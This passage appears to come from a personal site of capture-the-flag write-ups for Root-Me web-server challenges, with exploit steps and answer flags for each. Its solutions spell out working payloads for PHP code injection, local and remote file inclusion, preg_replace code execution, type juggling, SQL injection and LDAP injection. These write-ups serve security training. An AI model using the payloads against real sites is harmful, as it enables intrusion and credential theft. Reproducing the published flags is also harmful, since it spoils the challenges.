We can see the pages are referenced via php local files.  The available pages can be visited using the URLs:

~~~
http://challenge01.root-me.org/web-serveur/ch47/?page=home
http://challenge01.root-me.org/web-serveur/ch47/?page=about
http://challenge01.root-me.org/web-serveur/ch47/?page=contact
~~~

Trying the flag, we get an error:

~~~
http://challenge01.root-me.org/web-serveur/ch47/?page=.passwd

'includes/.passwd.php'File does not exist
~~~

We can see the text input is appended with php to load the relevant page.  Trying to interfere with this we can insert an apostrophe:

~~~
http://challenge01.root-me.org/web-serveur/ch47/?page=contact%27

Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: strpos('includes/contact'.php', '..') === false in /challenge/web-serveur/ch47/index.php on line 8 
~~~

This provides us with the syntax for the php redirect:

~~~php
strpos('includes/contact'.php', '..') === false
~~~

We can append a new command to see if this is injectable:

~~~php
http://challenge01.root-me.org/web-serveur/ch47/?page=contact','..') === false and print 'this is a test injection' and strpos('
~~~

This returns:

~~~
this is a test injection'includes/contact','..') === false and print 'this is a test injection' and strpos('.php'File does not exist
~~~ 

We can inject php into this to open and print the flag:

~~~php
http://challenge01.root-me.org/web-serveur/ch47/?page=contact','..') === false and print fread(fopen('.passwd','r'), filesize('.passwd')) and strpos('
~~~

And we find the password!

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
x4Ss3rT1nglSn0ts4f3A7A1Lx
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---	

## PHP filters

- Author: g0uZ
- Date: 27 February 2011
- Points: 25
- Level: 3

### Statement

Retrieve the administrator password of this application.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch12/).

### Resources

1. [using and understanding PHP streams](https://repository.root-me.org/Programmation/PHP/EN%20-%20Using%20and%20understanding%20PHP%20streams%20and%20filters.pdf).
2. [Exploiting LFI using co hosted web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20LFI%20using%20co%20hosted%20web%20applications.pdf).
3. [Source code auditing algorithm for detecting LFI and RFI](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Source%20code%20auditing%20algorithm%20for%20detecting%20LFI%20and%20RFI.pdf).
4. [Local File Inclusion](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Local%20File%20Inclusion.pdf).
5. [Remote File Inclusion and Local File Inclusion explained](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Remote%20File%20Inclusion%20and%20Local%20File%20Inclusion%20explained.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can see the site source code:

~~~html
<html>
  <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>FileManager v 0.01</h1>
    <ul>
      <li><a href="?inc=accueil.php">home</a></li>
      <li><a href="?inc=login.php">login</a></li>
    </ul>
    <h3>Welcome !</h3>
    <p>Please login to view the files.</p>
  </body>
</html>
~~~

We can see the pages are referenced via ?inc LFI.  The available pages can be visited using the URLs:

~~~
http://challenge01.root-me.org/web-serveur/ch12/?inc=accueil.php
http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php
~~~

Details of LFI filters can be found on [medium.com](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601)  we can use a filter command in the ?inc= php statement.  Lets try with both pages:

~~~
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php
~~~

returns:

~~~html
<html>
 <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>FileManager v 0.01</h1>
    <ul>
	<li><a href="?inc=accueil.php">home</a></li>
	<li><a href="?inc=login.php">login</a></li>
    </ul>
PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI+V2VsY29tZSBiYWNrICE8L2gyPiIpOwogICAgICBwcmludCgiVG8gdmFsaWRhdGUgdGhlIGNoYWxsZW5nZSB1c2UgdGhpcyBwYXNzd29yZDxici8+PGJyLz4iKTsKICAgIH0gZWxzZSB7CiAgICAgIHByaW50KCI8aDM+RXJyb3IgOiBubyBzdWNoIHVzZXIvcGFzc3dvcmQ8L2gyPjxiciAvPiIpOwogICAgfQp9IGVsc2Ugewo/PgoKPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgTG9naW4mbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgLz48YnIvPjxici8+CiAgUGFzc3dvcmQmbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+PGJyLz48YnIvPgogIDxici8+PGJyLz4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY29ubmVjdCIgLz48YnIvPjxici8+CjwvZm9ybT4KCjw/cGhwIH0gPz4=
  </body>
  </html>
~~~

We get a base64 encoded login.php file:

~~~
PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI
~~~

this can be decoded as ascii:

~~~html
<?php
include "config.php";

if (isset($_POST["username"]) && isset($_POST["password"])) {
    if ($_POST["username"] == $username && $_POST["password"] == $password) {
        print "<h2>Welcome back !</h2>";
        print "To validate the challenge use this password<br/><br/>";
    } else {
        print "<h3>Error : no such user/password</h2><br />";
    }
} else {
     ?>

<form action="" method="post">
  Login&nbsp;<br/>
  <input type="text" name="username" /><br/><br/>
  Password&nbsp;<br/>
  <input type="password" name="password" /><br/><br/>
  <br/><br/>
  <input type="submit" value="connect" /><br/><br/>
</form>

<?php
} ?>
~~~

We can see another file... config.php we cannot view this in the browser, but can we use the filter to get it?

~~~
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
~~~

This returns the base64 string:

~~~
PD9waHAKJHVzZXJuYW1lPSJhZG1pbiI7CiRwYXNzd29yZD0iREFQdDlEMm1reTBBUEFGIjsK
~~~

Decoded:

~~~html
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
~~~

We can login with these credentials to get the solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
DAPt9D2mky0APAF
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---


## PHP register globals

- Author: g0uZ
- Date: 08 October 2011
- Points: 25
- Level: 3

### Statement

It seems that the developper often leaves backup files around...

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch17/).

### Resources

1. [Using register globals in PHP](https://repository.root-me.org/Programmation/PHP/EN%20-%20Using%20register%20globals%20in%20PHP.pdf).
2. [OWASP testing guide v4](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf).
3. [OWASP testing guide v3](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v3.pdf).
4. [OWASP testing guide v2](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v2.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can see the site source code:

~~~html
<html>
  <head>
  </head>
  <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>Authentication v 0.05</h1>
    <form action="" method="POST">
      Password&nbsp;<br/>
      <input type="password" name="password" /><br/><br/>
      <br/><br/>
      <input type="submit" value="connect" /><br/><br/>
    </form>
    <h3>try again</h3>
  </body>
</html>
~~~

As detailed on [stack overflow](https://stackoverflow.com/questions/21368051/register-globals-exploit-session-array) we can exploit the session data variable using ?_SESSION[logged]=1

~~~
http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1
~~~

This provides the solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
NoTQYipcRKkgrqG
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Local File Inclusion

- Author: g0uZ
- Date: 02 October 2011
- Points: 30
- Level: 3

### Statement

Get in the admin section.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch16/).

### Resources

1. [Exploiting LFI using co hosted web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20LFI%20using%20co%20hosted%20web%20applications.pdf).
2. [Source coding auditing algorithm for detecting LFI and RFI](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Source%20code%20auditing%20algorithm%20for%20detecting%20LFI%20and%20RFI.pdf).
3. [Local File Inclusion](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Local%20File%20Inclusion.pdf).
4. [Remote File Inclusion and Local File Inclusion explained](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Remote%20File%20Inclusion%20and%20Local%20File%20Inclusion%20explained.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We visit the site and see files included in the websites subdirectory that are available via the menu.  By navigating to the root directory, we find a folder named "admin" that we can access:

~~~
http://challenge01.root-me.org/web-serveur/ch16/?files=../admin
~~~

This has a php index file which contains the admin password.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
OpbNJ60xYpvAQU8
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Local File Inclusion Double encoding

- Author: zM_
- Date: 13 June 2016
- Points: 30
- Level: 3

### Statement

Find the validation password in the source files of the website.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch45/).

### Resources

1. [Double Encoding](https://www.owasp.org/index.php/Double_Encoding).
2. [Local File Inclusion](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Local%20File%20Inclusion.pdf).
3. Remote File Inclusion and Local File Inclusion Explained](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Remote%20File%20Inclusion%20and%20Local%20File%20Inclusion%20explained.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We visit the site and see files related to a guys CV.  Attempting to visit the root directory (http://challenge01.root-me.org/web-serveur/ch45/index.php?page=../) we get the response ("Attack detected").

We will need to use a filter with double encoding to bypass the web filter.

~~~
php://filter/convert.base64-encode/resource=cv
double encoded becomes:
php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv
~~~

Appending this to the URL provides a base64 encoded html cv file. This can be [decoded online](https://www.base64decode.org/) to reveal the cv source code:

~~~html
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - CV</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home">Home</a>
      <a href="index.php?page=cv" class="active">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <h1><?= $conf['contact']['firstname'] ?> <?= $conf['contact']['lastname'] ?></h1>
    <h3>Professional doer</h3>
    <?= $conf['cv']['gender'] ? "Male" : "Female" ?><br>
    <?= date('Y/m/d', $conf['cv']['birth']) ?> (<?= date('Y')-date('Y', $conf['cv']['birth']) ?>)
    <?php
      foreach ($conf['cv']['jobs'] as $job) {
    ?>
      <div class="job">
        <h4><?= $job['title'] ?> - <span class="date"><?= $job['date'] ?></span></h4>
      </div>
    <?php
      }
    ?>
  </body>
</html>
~~~

This reveals the config file conf.inc.php, we can access using the same filter:
	
~~~
http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf
~~~

Which provides a base64 encoding of the conf php file including the challenge password.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
Th1sIsTh3Fl4g!
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## PHP preg replace

- Author: sambecks
- Date: 2 March 2016
- Points: 30
- Level: 3

### Statement

Read flag.php

</details>

### Link

- [ch37](http://challenge01.root-me.org/web-serveur/ch37/)

### Resources

None.

### Solutions

<details>

<summary markdown="span">Solution</summary>

We can visit the website and find a html form with three inputs: search, replace and content:

~~~html
<html>
<head><title>Regex evaluator</title></head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>

<br /><br /><fieldset><legend>Regex evaluator</legend>
<form METHOD="POST" action="index.php">
<div>
<input type="text" name="search" placeholder="search" style="width:250px;">
</div>
<br />
<div>
<input type="text" name="replace" placeholder="replace" style="width:250px;">
</div>
<br />
<div>
<input type="text" name="content" placeholder="content" style="width:250px;">
</div>
<br />
<button type="submit">Submit</button>
</form>
~~~

As detailed on the [php.net](https://www.php.net/manual/en/function.preg-replace.php) the preg replace searches a subject (content) for a patterm (search) and replaces them with a replacement (replace).  We can try a simple request:

~~~
search = /answer/e
replace = file_get_contents("flag.php")
content = the flag is answer
~~~

submitting this to the form, we get the response:

~~~
the flag is <?php $flag="".file_get_contents(".passwd").""; ?> 
~~~

We can adjust the query to:

~~~
search = /answer/e
replace = file_get_contents(".passwd")
content = the flag is answer
~~~

This gives the response:

~~~
the flag is pr3g_r3pl4c3_3_m0d1f13r_styl3
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
pr3g_r3pl4c3_3_m0d1f13r_styl3
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## PHP type juggling

- Author: vic
- Date: 10 March 2016
- Points: 30
- Level: 3

### Statement

Get an access.

</details>

### Link

- [ch44](http://challenge01.root-me.org/web-serveur/ch44/)

### Resources

1. [PHP loose comparison - Type Juggling](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20loose%20comparison%20-%20Type%20Juggling%20-%20OWASP.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

We can visit the website and find a html form with two inputs: login and password:

~~~html
<!DOCTYPE html>
<html>
    <head>
        <title>PHP loose comparison</title>
    </head>

   <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
        <form action="auth.php" class="authform" method="post" accept-charset="utf-8">
        <fieldset>
            <legend>Authentication</legend>
            <input type="text" id="login" name="login" value="" placeholder="Your login" />
            <input type="password" id="password" name="password" value="" placeholder="Your password" />
            <input type="submit" name="submit" value="Authenticate" />
        
        <div class="return-value" style="padding: 10px 0">&nbsp;
        </div>
        </fieldset>
        </form>
        <br>
        <p><em><a href="auth.php?source">Authentication source code</a></em></p>

        <script src="jquery-2.2.1.min.js" type="text/javascript"></script>
        <script src="sha256.js" type="text/javascript"></script>
        <script type="text/javascript">
        $("document").ready(function(){
            $(".authform").submit(function(){
                $(".return-value").html("&nbsp;");

                var hashobj = new jsSHA("SHA-256", "TEXT");
                hashobj.update($('#password').val());
                var hashpass = hashobj.getHash("HEX");

                var data = {login: $('#login').val(), password: hashpass};

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    url: "auth.php",
                    data: {auth : JSON.stringify({data})},
                    success: function(data) {
                        $(".return-value").html(
                            "Result: " + data['status']
                        );
                    }
                });
                return false;
            });
        });

        </script>
    </body>

</html> 

~~~

From the challenge site we can view the auth.php authentication script:

~~~php
 <?php

// $FLAG, $USER and $PASSWORD_SHA256 in secret file
require("secret.php");

// show my source code
if(isset($_GET['source'])){
    show_source(__FILE__);
    die();
}

$return['status'] = 'Authentication failed!';
if (isset($_POST["auth"]))  { 
    // retrieve JSON data
    $auth = @json_decode($_POST['auth'], true);
    
    // check login and password (sha256)
    if($auth['data']['login'] == $USER && !strcmp($auth['data']['password'], $PASSWORD_SHA256)){
        $return['status'] = "Access granted! The validation password is: $FLAG";
    }
}
print json_encode($return);
~~~

Using JSON encoded requests, we can set the username to 0 and password = [].  This provides the response:

~~~
DontForgetPHPL00seComp4r1s0n
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
DontForgetPHPL00seComp4r1s0n
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Remote File Inclusion

- Author: g0uZ
- Date: 25 November 2015
- Points: 30
- Level: 3

### Statement

Get the PHP source code.

</details>

### Link

- [ch13](http://challenge01.root-me.org/web-serveur/ch13/)

### Resources

1. [Source code auditing algorithm for detecting LFI and RFI](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Source%20code%20auditing%20algorithm%20for%20detecting%20LFI%20and%20RFI.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

We can visit the website and find a html page with two included webpages:

~~~html

<html>
<head><title>Remote File Inclusion</title></head>

<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>

<h3>
    Language : 
    <a href="?lang=fr" style="text-decoration:none">Français</a>
    &nbsp;|&nbsp;
    <a href="?lang=en" style="text-decoration:underline">English</a>
</h3>

<p>Welcome on our new website!</p>

</body>
</html>
~~~

We can see the URL changes dependent on language:

~~~
http://challenge01.root-me.org/web-serveur/ch13/?lang=en
http://challenge01.root-me.org/web-serveur/ch13/?lang=fr
~~~

We can see remote files can be loaded onto the webpage by navigating to:

~~~
http://challenge01.root-me.org/web-serveur/ch13/?lang=http://google.com?
~~~

This loads the google search engine into the webpage.  We can load the index.php using a short php script:

~~~
http://challenge01.root-me.org/web-serveur/ch13/?lang=data:text/plain,%3C?php%20echo%20base64_encode(file_get_contents(%22index.php%22));%20?%3E
~~~

This returns:

~~~
PD9waHAKCi8qCgpDb25ncmF0eiEKCkxlIG1vdCBkZSBwYXNzZSBkZSB2YWxpZGF0aW9uIGVzdCA6IApUaGUgdmFsaWRhdGlvbiBwYXNzd29yZCBpcyA6IAoKUjNtMHQzX2lTX3IzYUwxeV8zdjFsCgoqLwoKJGxhbmd1YWdlPSJlbiI7CmlmICggaXNzZXQoJF9HRVRbImxhbmciXSkgKXsKICAgICRsYW5ndWFnZSA9ICRfR0VUWyJsYW5nIl07Cn0KaW5jbHVkZSgkbGFuZ3VhZ2UuIl9sYW5nLnBocCIpOwo/PgoKPGh0bWw+CjxoZWFkPjx0aXRsZT5SZW1vdGUgRmlsZSBJbmNsdXNpb248L3RpdGxlPjwvaGVhZD4KCjxib2R5PgoKPGgzPgogICAgPD9waHAgZWNobyAkbGFuZ1snbGFuZyddOyA/PiA6IAogICAgPGEgaHJlZj0iP2xhbmc9ZnIiIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246PD9waHAgKCRsYW5ndWFnZT09ImZyIik/cHJpbnQgInVuZGVybGluZSI6cHJpbnQgIm5vbmUiOyA/PiI+RnJhbsOnYWlzPC9hPgogICAgJm5ic3A7fCZuYnNwOwogICAgPGEgaHJlZj0iP2xhbmc9ZW4iIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246PD9waHAgKCRsYW5ndWFnZT09ImVuIik/cHJpbnQgInVuZGVybGluZSI6cHJpbnQgIm5vbmUiOyA/PiI+RW5nbGlzaDwvYT4KPC9oMz4KCjxwPjw/cGhwIGVjaG8gJGxhbmdbIndlbGNvbWUiXTsgPz48L3A+Cgo8L2JvZHk+CjwvaHRtbD4K_lang.php 
~~~

This can be decoded from Base64:

~~~php
<?php

/*

Congratz!

Le mot de passe de validation est : 
The validation password is : 

R3m0t3_iS_r3aL1y_3v1l

*/

...
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
R3m0t3_iS_r3aL1y_3v1l
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## SQL injection Authentication

- Author: g0uZ
- Date: 27 February 2011
- Points: 30
- Level: 3

### Statement

Retrieve the administrator password

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch9/).

### Resources

1. [Blackhat Europe 2009 - Advanced SQL injection whitepaper](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202009%20-%20Advanced%20SQL%20injection%20whitepaper.pdf).
2. [Guide to PHP security: chapter 3 SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Guide%20to%20PHP%20security%20:%20chapter%203%20SQL%20injection.pdf).
3. [BLackhat US 2006: SQL Injections by truncation](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20US%202006%20:%20SQL%20Injections%20by%20truncation.pdf).
4. [Manipulating SQL server using SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Manipulating%20SQL%20server%20using%20SQL%20injection.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h1>Authentication v 0.01
    </h1>
    <form action="" method="post">
      Login&nbsp;
      <br/>
      <input type="text" name="login" />
      <br/>
      <br/>
      Password&nbsp;
      <br/>
      <input type="password" name="password" />
      <br/>
      <br/>
      <br/>
      <br/>
      <input type="submit" value="connect" />
      <br/>
      <br/>
    </form>
  </body>
</html>
~~~

The challenge refers to SQL injection, we can try multiple templates and are successful with:

~~~
username = admin
password = password' OR 1=1--'
~~~

This provides the login details for user1:

~~~
username = user1
password = TYsgv75zgtq
~~~

This is returning an incorrect record.  We can use the [SQLite LIMIT](https://www.sqlitetutorial.net/sqlite-limit/) clause to constrain the number of rows returned by the query.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
t0_W34k!$
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## SQL injection String

- Author: g0uZ
- Date: 24 December 2012
- Points: 30
- Level: 3

### Statement

Retrieve the administrator password

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch19/).

### Resources

1. [Blackhat Europe 2009 - Advanced SQL injection whitepaper](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202009%20-%20Advanced%20SQL%20injection%20whitepaper.pdf).
2. [Guide to PHP security: chapter 3 SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Guide%20to%20PHP%20security%20:%20chapter%203%20SQL%20injection.pdf).
3. [BLackhat US 2006: SQL Injections by truncation](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20US%202006%20:%20SQL%20Injections%20by%20truncation.pdf).
4. [Manipulating SQL server using SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Manipulating%20SQL%20server%20using%20SQL%20injection.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the site, we find a search function that we can inject queries into.  After several trials, we find the following injection that provides the usernames and passwords:

~~~
admin' or id='1' union select username,password from users-- -+
~~~

This provides 3 usernames and passwords including the admin password.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
c4K04dtIaJsuWdi
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## LDAP injection Authentication

- Author: g0uZ
- Date: 26 May 2013
- Points: 35
- Level: 3

### Statement

Bypass authentication mecanism.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch25/).

### Resources

1. [Blackhat Europe 2008 - LDAP Injection & Blind LDAP Injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202008%20%20-%20LDAP%20Injection%20&%20Blind%20LDAP%20Injection.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the site, we find a form requesting username and password.  Trying username = "admin" and password = "password" we get response "unknown identifiers".  We can try to interfere with the LDAP query with a simple inject: username = ")))" and password = "password".  We get a helpful response:

~~~
ERROR : Invalid LDAP syntax : (&(uid=))))(userPassword=password))
~~~

We can now construct an inject using the known query format:
	
~~~
(&(uid = <username inject>)(userPassword = <password inject>))
~~~

The & statement requires both values to be true.  We can enter an OR statement in the password query with the following inject:

~~~
username = "*)(|(userPassword=*"
password = "password)"

(&(uid = *)(|(userPassword=*)(userPassword = password)))
~~~

This provides the password details in the source code of the website.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
SWRwehpkTI3Vu2F9DoTJJ0LBO
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

Last updated Jan 2022.

## [djm89uk.github.io](https://djm89uk.github.io)
